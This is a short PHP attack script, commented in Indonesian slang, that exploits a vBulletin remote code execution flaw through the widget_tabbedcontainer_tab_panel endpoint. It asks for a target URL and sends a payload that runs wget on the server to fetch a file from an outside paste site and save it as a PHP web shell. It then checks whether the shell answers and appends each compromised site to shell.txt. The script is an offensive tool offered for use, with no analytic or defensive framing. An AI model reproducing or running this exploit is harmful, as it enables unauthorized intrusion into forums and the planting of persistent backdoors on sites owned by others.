<?php 
/*  vbulletin RCE CVE bypass direct
langsung crot Sama Aing ./Dandy Vlin Code
 */
 error_reporting(0);
 echo " ~] Url to vBulletin : ";
$url = trim(fgets(STDIN));
	    $d = "subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo passthru('wget -S https://ghostbin.co/paste/g2gen/raw -O (build kamu disini namanya apa/yang kamu simpen di ghostbin anjing).php');";
    $vb     = curl_init();
    curl_setopt($vb, CURLOPT_URL, $url . '/ajax/render/widget_tabbedcontainer_tab_panel');
    curl_setopt($vb, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($vb, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt ($vb, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt ($vb, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($vb, CURLOPT_TIMEOUT, 10);
    curl_setopt($vb, CURLOPT_POSTFIELDS, $d);
    $memek = curl_exec($vb);
    curl_close($vb);
    $tempek = curl_init();
    curl_setopt($tempek, CURLOPT_URL, $url . '/yourbuild.php');
    curl_setopt($tempek, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($tempek, CURLOPT_FOLLOWLOCATION, 1);
    $pu    = curl_exec($tempek);
    $bjirr = curl_getinfo($tempek, CURLINFO_HTTP_CODE);
    curl_close($tempek);
    if ($bjirr == 200) {
        echo "$url saved (shell.txt)\n";
        $save = 'shell.txt';
            $seve = fopen($save, 'a+') or die('Cannot open file:  '.$save);
            $data = $url . '/yourbuild.php';
            fwrite($seve, "\n".$data);
            fclose($seve);
    } else if ($bjirr == 404) {
        echo "not vuln\n";
    }
    else if ($bjirr == 403) {
        echo "not vuln\n";
    }
    else if ($bjirr == 400) {
        echo "not vuln\n";
    }
    else if ($bjirr == 500) {
        echo "not vuln\n";
    }
    else if ($bjirr == 301) {
        echo "not vuln\n";
    }
    else if ($bjirr == 503) {
        echo "not vuln\n";
    }
    ?>
